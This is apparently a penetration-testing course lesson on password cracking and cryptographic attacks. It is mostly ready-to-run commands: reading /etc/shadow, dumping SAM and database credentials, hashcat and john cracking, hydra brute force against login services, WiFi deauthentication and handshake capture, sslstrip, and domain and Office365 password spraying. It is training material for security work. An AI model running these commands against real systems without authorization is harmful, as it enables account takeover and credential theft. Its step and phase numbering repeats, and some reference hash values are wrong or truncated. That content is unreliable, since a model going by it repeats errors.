# LESSON 6: Password Attacks & Cryptography

## Objective
Master password cracking techniques, hash analysis, and cryptographic attacks. Learn to crack hashes, analyze encrypted data, and exploit weak cryptographic implementations.

## Prerequisites
- Lessons 1-5 completed
- Understanding of hashing algorithms
- Basic cryptography knowledge

## Phase 1: Hash Identification & Analysis

### Step 1: Hash Recognition
```bash
# Common hash formats
echo "5d41402abc4b2a76b9719d911017c592" | hashid -
hash-identifier
hashcat --example-hashes | grep -i md5

# Hash length identification
# MD5: 32 chars
# SHA1: 40 chars  
# SHA256: 64 chars
# NTLM: 32 chars
```

### Step 2: Hash Extraction
```bash
# Linux password hashes
sudo cat /etc/shadow
john --wordlist=passwords.txt /etc/shadow

# Windows SAM hashes
samdump2 SYSTEM SAM
pwdump system sam

# Web application hash extraction
sqlmap -u "http://target/login" --dump -D users -T accounts
```

## Phase 2: Dictionary Attacks

### Step 3: Wordlist Preparation
```bash
# Download common wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
curl -L -o rockyou.txt https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz

# Custom wordlist generation
cewl https://target-website.com -d 2 -m 5 -w custom_wordlist.txt
cupp -i  # Interactive wordlist generator

# Wordlist manipulation
john --wordlist=rockyou.txt --rules --stdout > enhanced_wordlist.txt
```

### Step 4: John the Ripper Attacks
```bash
# Basic dictionary attack
john --wordlist=rockyou.txt hashes.txt

# Rule-based attack
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental/brute force
john --incremental hashes.txt
```

### Step 5: Hashcat Attacks
```bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Dictionary + rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule

# Combination attack
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt

# Mask attack (brute force with patterns)
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?d

# Hybrid attack
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d
```

## Phase 3: Advanced Password Attacks

### Step 6: Rainbow Tables
```bash
# Generate rainbow tables
rtgen md5 loweralpha 1 7 0 3800 33554432 0
rtsort *.rt

# Crack with rainbow tables
rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592
```

### Step 7: Online Password Attacks
```bash
# HTTP basic auth brute force
hydra -L users.txt -P passwords.txt http-get://target/admin/

# HTTP form brute force
hydra -L users.txt -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SSH brute force
hydra -L users.txt -P passwords.txt ssh://target

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target

# SMB brute force
hydra -L users.txt -P passwords.txt smb://target
```

### Step 8: Database Password Attacks
```bash
# MySQL brute force
hydra -L users.txt -P passwords.txt mysql://target

# PostgreSQL brute force
hydra -L users.txt -P passwords.txt postgres://target

# MSSQL brute force
hydra -L users.txt -P passwords.txt mssql://target
```

## Phase 4: Modern Hash Attacks

### Step 9: Advanced Hash Cracking
```bash
# bcrypt hash cracking (computationally expensive)
hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt
john --format=bcrypt --wordlist=rockyou.txt bcrypt_hashes.txt

# scrypt hash cracking (memory-hard)
hashcat -m 8900 -a 0 scrypt_hashes.txt rockyou.txt

# PBKDF2 variants
hashcat -m 10000 -a 0 pbkdf2_sha256.txt rockyou.txt  # Django PBKDF2-SHA256
hashcat -m 10900 -a 0 pbkdf2_sha1.txt rockyou.txt    # PBKDF2-HMAC-SHA1

# Argon2 hash cracking (very expensive)
hashcat -m 19500 -a 0 argon2_hashes.txt rockyou.txt  # Argon2d
hashcat -m 19600 -a 0 argon2_hashes.txt rockyou.txt  # Argon2id

# Modern database hashes
hashcat -m 12001 -a 0 mysql_sha2.txt rockyou.txt     # MySQL CACHING_SHA2_PASSWORD
hashcat -m 31300 -a 0 oracle12c.txt rockyou.txt     # Oracle 12c
```

### Step 10: Application-Specific Hash Formats
```bash
# Modern web application hashes
# WordPress (PHPass)
hashcat -m 400 -a 0 wordpress_hashes.txt rockyou.txt

# Laravel hash cracking
hashcat -m 20711 -a 0 laravel_hashes.txt rockyou.txt

# Django hash formats
hashcat -m 10000 -a 0 django_pbkdf2.txt rockyou.txt

# Node.js bcrypt
hashcat -m 3200 -a 0 nodejs_bcrypt.txt rockyou.txt

# Ruby on Rails
hashcat -m 7400 -a 0 rails_hashes.txt rockyou.txt

# ASP.NET Identity
hashcat -m 1800 -a 0 aspnet_hashes.txt rockyou.txt
```

### Step 11: Cloud Service Hash Attacks
```bash
# AWS Cognito (bcrypt variant)
hashcat -m 3200 -a 0 cognito_hashes.txt rockyou.txt

# Firebase Auth (scrypt variant)
# Custom parameters: N=16384, r=8, p=1
hashcat -m 8900 -a 0 firebase_hashes.txt rockyou.txt

# Auth0 (bcrypt)
hashcat -m 3200 -a 0 auth0_hashes.txt rockyou.txt
```

### Step 12: Time/Cost Optimization for Modern Hashes
```bash
# Optimize hashcat for expensive hashes
# Use smaller wordlists first
hashcat -m 3200 -a 0 bcrypt_hashes.txt top10000.txt

# Use rules for bcrypt (computationally expensive)
hashcat -m 3200 -a 0 -r best64.rule bcrypt_hashes.txt small_wordlist.txt

# Hybrid attacks for expensive hashes
hashcat -m 3200 -a 6 bcrypt_hashes.txt wordlist.txt ?d?d?d?d

# Mask attacks with reasonable keyspace
hashcat -m 3200 -a 3 bcrypt_hashes.txt ?u?l?l?l?l?l?d?d

# Check progress and estimated time
hashcat --status

# Resume interrupted sessions
hashcat --restore
```

## Phase 5: Cryptographic Attacks

### Step 13: SSL/TLS Analysis
```bash
# SSL cipher analysis
sslscan target:443
testssl.sh target

# Certificate analysis
openssl s_client -connect target:443 -showcerts

# Weak cipher exploitation
sslstrip
```

### Step 10: Wireless Cryptography
```bash
# WPA/WPA2 handshake capture
airmon-ng start wlan0
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# WPA handshake cracking
aircrack-ng -w rockyou.txt capture-01.cap
hashcat -m 2500 capture.hccapx rockyou.txt
```

### Step 11: Encryption Analysis
```bash
# File encryption identification
file encrypted_file
binwalk encrypted_file

# Weak encryption detection
openssl enc -d -aes-256-cbc -in encrypted.txt -k password

# ROT13/Caesar cipher
echo "encrypted_text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

## Phase 5: Hash Cracking Optimization

### Step 12: GPU Acceleration
```bash
# Check GPU support
hashcat -I

# NVIDIA CUDA optimization
hashcat -m 0 -a 0 -w 3 -O hashes.txt rockyou.txt

# Multiple GPU utilization
hashcat -m 0 -a 0 -d 1,2,3 hashes.txt rockyou.txt
```

### Step 13: Distributed Cracking
```bash
# Hashtopolis setup (distributed cracking)
# Multiple machines working on same hash set

# Cloud cracking
# AWS/Google Cloud GPU instances
```

## Phase 6: Password Policy Analysis

### Step 14: Password Complexity Analysis
```bash
# Analyze cracked passwords
python3 pipal.py cracked_passwords.txt

# Generate statistics
john --show --format=raw-md5 | cut -d: -f2 | pipal.py
```

### Step 15: Password Spraying
```bash
# Domain password spray
crackmapexec smb target -u users.txt -p 'Password123!'

# Office365 password spray
MSOLSpray.py --userlist users.txt --password 'Winter2023!'

# Custom password spray
for user in $(cat users.txt); do
    echo "Trying $user:Password123!"
    smbclient //target/share -U $user%Password123!
done
```

## Custom Scripts Usage

### hash_cracker.py
```bash
# Comprehensive hash cracking toolkit
python3 scripts/lesson_06_password_attacks/hash_cracker.py --hash 5d41402abc4b2a76b9719d911017c592 --wordlist rockyou.txt
```

### password_analyzer.py
```bash
# Analyze password complexity and patterns
python3 scripts/lesson_06_password_attacks/password_analyzer.py --passwords cracked_passwords.txt
```

## Evidence Collection

### Step 16: Document Password Attacks
```bash
# Save cracked hashes
john --show --format=raw-md5 > cracked_hashes.txt

# Password statistics
echo "$(date): Cracked $(wc -l < cracked_hashes.txt) passwords" >> password_audit.log

# Hash analysis report
hashcat --show hashes.txt > hashcat_results.txt
```

## Success Criteria

✓ Hash types identified correctly
✓ Dictionary attacks successful
✓ Rule-based attacks implemented
✓ Online brute force attacks executed
✓ Cryptographic weaknesses identified
✓ GPU acceleration utilized
✓ Password policies analyzed
✓ Custom scripts functioning

## Common Hash Types Reference

| Hash Type | Length | Example |
|-----------|---------|---------|
| MD5 | 32 | 5d41402abc4b2a76b9719d911017c592 |
| SHA1 | 40 | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| SHA256 | 64 | 2cf24dba4f21d4288094e678c35259e732c8e7c9a98b0a05f1b3b4b2e5e8b2dd |
| NTLM | 32 | 8846f7eaee8fb117ad06bdd830b7586c |
| bcrypt | 60 | $2a$10$N9qo8uLOickgx2ZMRZoMye |

## Defense Recommendations

- Implement strong password policies
- Use multi-factor authentication
- Regular password audits
- Account lockout policies
- Monitor for brute force attempts
- Use password managers
- Hash passwords with salt

## Next Lesson Preview
**Lesson 7**: Wireless & Bluetooth Security
- WiFi network attacks
- Bluetooth exploitation
- Radio frequency analysis